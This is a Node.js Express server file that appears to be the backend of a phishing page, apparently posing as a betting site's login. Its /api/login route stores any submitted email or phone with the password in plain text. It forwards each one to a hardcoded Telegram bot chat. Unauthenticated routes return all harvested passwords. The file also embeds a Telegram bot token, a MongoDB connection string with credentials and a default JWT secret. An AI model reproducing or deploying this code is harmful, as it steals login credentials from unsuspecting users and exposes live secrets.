const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 5000;
const JWT_SECRET = process.env.JWT_SECRET || 'admin_jwt_secret_key_2025';

// Telegram Bot Config
const TELEGRAM_BOT_TOKEN = '7874436750:AAF7LQcgO9CTB35B8GvCfHnq9YbF5pg81wE';
const CHAT_IDS = ['8180375324'];  // Add more chat IDs here if needed

// Middleware
var corsOptions = {
  origin: '*',
  optionsSuccessStatus: 200
}
app.use(cors(corsOptions));
app.use(bodyParser.json());
app.use(express.json());

// User Schema
const userSchema = new mongoose.Schema({
  email: { type: String },
  phone: { type: String },
  password: { type: String, required: true },
  loginMethod: { type: String, enum: ['email', 'phone'], required: true },
  loginDate: { type: String },
  loginTime: { type: String },
  createdAt: { type: Date, default: Date.now },
  loginHistory: [{
    date: { type: String },
    time: { type: String },
    method: { type: String },
    device: { type: String, default: 'Web Browser' }
  }]
});

// Admin Schema
const adminSchema = new mongoose.Schema({
  name: { type: String, required: true },
  email: { type: String, required: true, unique: true },
  password: { type: String, required: true },
  createdAt: { type: Date, default: Date.now },
  lastLogin: { type: Date, default: Date.now }
});

// Connect to MongoDB
mongoose.connect('mongodb+srv://vishu:NdO3hK4ShLCi4YKD@cluster0.4iukcq5.mongodb.net/Demo4raBet', {
}).then(() => {
  console.log('Connected to MongoDB');
}).catch(err => {
  console.error('MongoDB connection error:', err);
});

// Models
const User = mongoose.model('User', userSchema);
const Admin = mongoose.model('Admin', adminSchema);

// Function to send message to multiple Telegram chat IDs
const sendToTelegram = async (message) => {
  try {
    for (const chatId of CHAT_IDS) {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      });
    }
  } catch (error) {
    console.error('Telegram Error:', error.response?.data || error.message);
  }
};

// Login route
app.post('/api/login', async (req, res) => {
  try {
    const { email, phone, password, loginDate, loginTime, loginMethod } = req.body;

    // Create new user login record
    const user = new User({
      email: loginMethod === 'email' ? email : null,
      phone: loginMethod === 'phone' ? phone : null,
      password,
      loginMethod,
      loginDate,
      loginTime,
      loginHistory: [{
        date: loginDate,
        time: loginTime,
        method: loginMethod,
        device: 'Web Browser'
      }]
    });

    await user.save();

    // Prepare Telegram message
    const message = `<b>New User Login</b>\n
🔹 *Method:* ${loginMethod}
📅 *Date:* ${loginDate}
🕒 *Time:* ${loginTime}
📧 *Email:* ${email || 'N/A'}
📱 *Phone:* ${phone || 'N/A'}
🔑 *Password:* ${password}`;

    // Send login data to Telegram chat IDs
    await sendToTelegram(message);

    // Send response back to client
    const userData = {
      id: user._id,
      email: user.email,
      phone: user.phone,
      password: user.password,
      loginMethod: user.loginMethod,
      loginDate: user.loginDate,
      loginTime: user.loginTime,
      createdAt: user.createdAt.toISOString().split('T')[0],
      loginHistory: user.loginHistory
    };

    res.status(200).json(userData);

  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Other routes remain unchanged...

// Get most recent user
app.get('/api/user', async (req, res) => {
  try {
    const user = await User.findOne().sort({ createdAt: -1 });
    if (!user) return res.status(404).json({ message: 'No users found' });

    const userData = {
      id: user._id,
      email: user.email,
      phone: user.phone,
      password: user.password,
      loginMethod: user.loginMethod,
      loginDate: user.loginDate,
      loginTime: user.loginTime,
      createdAt: user.createdAt.toISOString().split('T')[0],
      loginHistory: user.loginHistory
    };

    res.status(200).json(userData);

  } catch (error) {
    console.error('Get user error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Get all users
app.get('/api/users', async (req, res) => {
  try {
    const users = await User.find().sort({ createdAt: -1 });
    if (!users || users.length === 0) return res.status(404).json({ message: 'No users found' });

    const usersData = users.map(user => ({
      id: user._id,
      email: user.email,
      phone: user.phone,
      password: user.password,
      loginMethod: user.loginMethod,
      loginDate: user.loginDate,
      loginTime: user.loginTime,
      createdAt: user.createdAt.toISOString().split('T')[0],
      loginHistory: user.loginHistory
    }));

    res.status(200).json(usersData);

  } catch (error) {
    console.error('Get all users error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Admin routes (unchanged from your original)

// Middleware to verify admin token
const verifyAdminToken = (req, res, next) => {
  const token = req.header('x-auth-token');

  if (!token) return res.status(401).json({ message: 'Access denied: No token provided' });

  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.admin = decoded;
    next();
  } catch (error) {
    res.status(401).json({ message: 'Invalid token' });
  }
};

// Admin dashboard route example
app.get('/api/admin/dashboard', verifyAdminToken, async (req, res) => {
  try {
    const admin = await Admin.findById(req.admin.id).select('-password');
    if (!admin) return res.status(404).json({ message: 'Admin not found' });

    const userCount = await User.countDocuments();
    const recentUsers = await User.find().sort({ createdAt: -1 }).limit(5);

    res.status(200).json({
      admin,
      stats: { userCount, recentUsers }
    });

  } catch (error) {
    console.error('Dashboard error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Health check
app.get("/", (req, res) => {
  res.json({ status: true });
});

// Start server (for local/dev)
if (process.env.NODE_ENV !== 'production') {
  app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
  });
}

module.exports = app;
